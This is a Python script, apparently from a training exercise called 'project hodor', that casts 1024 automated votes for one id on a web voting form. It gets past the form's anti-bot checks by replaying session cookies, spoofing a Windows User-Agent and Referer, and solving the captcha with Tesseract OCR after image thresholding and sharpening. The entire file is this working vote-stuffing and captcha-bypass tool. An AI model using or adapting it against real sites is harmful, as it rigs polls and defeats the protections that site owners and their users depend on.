#!/usr/bin/python3
import requests
import pytesseract
import PIL
from PIL import ImageFilter
"""level_3 module

    Votes 1024 times (hopefully) for id 2529 on level_3 of project hodor
    Voting requires to send the value from a cookie to work
    AND voting needs to come from a Windows machine
    AND voting needs solving an easy, 4 alphanumeric chars captcha
    """
# Target URL
url = "http://158.69.76.135/level3.php"

failed = 0
success = 0
total = 1024

# Start a session
session = requests.Session()

# Loop and pray
for i in range(total):
    # Request the form page and fetch the cookie
    res = session.get(url)
    dict = session.cookies.get_dict()

    # Download the captcha image
    image = session.get('http://158.69.76.135/captcha.php')
    # Write the content of the image to temp.png
    file = open("temp.png", "wb")
    file.write(image.content)
    file.close()

    # Open image, convert it to b&w, then threshold, enhance and sharpen
    img = PIL.Image.open("temp.png")
    bw = img.convert("L")
    bw.save("bw.png")
    threshold = bw.point(lambda p: p > 140 and 255)
    threshold.save("threshold.png")
    final = threshold.filter(PIL.ImageFilter.EDGE_ENHANCE_MORE)
    final = final.filter(PIL.ImageFilter.SHARPEN)
    # Save image as final.png
    final.save("final.png")

    # Add character whitelist to limit false positives
    custom = '-c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz'
    # Run the processed image through Tesseract's OCR
    captcha = pytesseract.image_to_string(PIL.Image.open('final.png'),
                                          config=custom)

    # Modify User-Agent with a Windows signature
    headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
               AppleWebKit/537.36 (KHTML, like Gecko) \
               Chrome/87.0.4280.88 Safari/537.36",
               'Referer': url}

    # Prepare payload of the POST request
    data = {'id': 2529,
            'key': dict['HoldTheDoor'],
            'captcha': captcha[0:4],
            'holdthedoor': 'Envoyer'}

    # Lick the stamp and SEND IT
    post = session.post(url, data=data, headers=headers)

    # Print stuff after each request
    print("Request #{:d}".format(i), end=' ')
    print("Key: {:s}".format(dict['HoldTheDoor']), end=' ')
    print("Captcha: {:s}".format(captcha[0:4]), end=' ')
    if post and "hacker" not in post.text:
        print("Request success")
        success += 1
    else:
        print("Request fail")
        failed += 1
    # Clear session cookies
    session.cookies.clear()

# Print stuff after all requests are done
print("{:d} requests sent".format(total))
print("{:d} requests succeded".format(success))
print("{:d} requests failed".format(failed))
